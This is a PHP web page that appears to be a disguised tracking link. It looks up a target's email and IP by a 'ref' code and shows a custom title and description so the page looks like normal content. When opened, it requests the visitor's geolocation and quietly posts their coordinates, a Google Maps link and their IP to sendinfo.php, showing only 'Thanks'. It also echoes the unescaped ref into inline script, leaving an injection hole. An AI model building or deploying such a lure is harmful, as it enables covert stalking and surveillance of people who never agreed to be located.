<?php
$ref = $_GET['ref'] ?? '';

// Function to fetch data from the file using the ref
function getTrackingData($ref) {
    $filePath = 'data.txt'; // Path to the data.txt file
    $lines = file($filePath); // Read all lines from the file
    
    foreach ($lines as $line) {
        $data = explode('|', $line); // Split each line by the delimiter '|'
        if (isset($data[2]) && $data[2] == $ref) { // Check if ref matches
            return [
                'email' => $data[0],
                'ip' => $data[1],
                'ref' => $data[2],
                'title' => $data[3] ?? 'Default Title', // Use the title from the file
                'description' => $data[4] ?? 'Default Description' // Use the description from the file
            ];
        }
    }
    return null; // Return null if ref not found
}

// Get tracking data from the file using the ref
$trackingData = getTrackingData($ref);
if ($trackingData === null) {
    // If no data is found for the ref, redirect to a blank page
    header("Location: blank.php");
    exit();
}

// Extract the title and description
$title = htmlspecialchars($trackingData['title']);
$description = htmlspecialchars($trackingData['description']);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="<?php echo $description; ?>"> <!-- Meta description -->
    <meta name="title" content="<?php echo $title; ?>"> <!-- Meta title -->
    <title><?php echo $title; ?></title> <!-- Page title -->
</head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;" id="body">
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Generate the Google Maps URL
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                // In thanks.php, update the fetch call to:
                fetch("sendinfo.php", {
                    method: "POST",
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ref: "<?php echo $ref; ?>",
                        lat, 
                        lon, 
                        googleMapsUrl,
                        ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>",
                    })
                });

                // Display the Thanks message
                document.getElementById("body").innerHTML = `
                    <h1>Thanks</h1>
                `;
            }, function(error) {
                // Handle geolocation errors
                alert("Please allow location access to proceed.");
            });
        } else {
            alert("Geolocation is not supported by your browser.");
        }
    </script>
</body>
</html>
